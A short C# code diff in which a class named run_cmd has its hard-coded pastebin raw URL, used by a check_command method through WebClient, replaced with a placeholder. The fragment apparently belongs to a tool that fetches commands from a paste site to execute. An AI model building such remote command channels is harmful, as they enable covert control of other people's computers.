@@ -387,7 +387,7 @@ public class run_cmd
     }
     public void check_command()
     {
-        string url = "https://pastebin.com/raw/wjGKGNKL";
+        string url = "PASTEBIN";
         using (WebClient client = new WebClient())
         {
             try
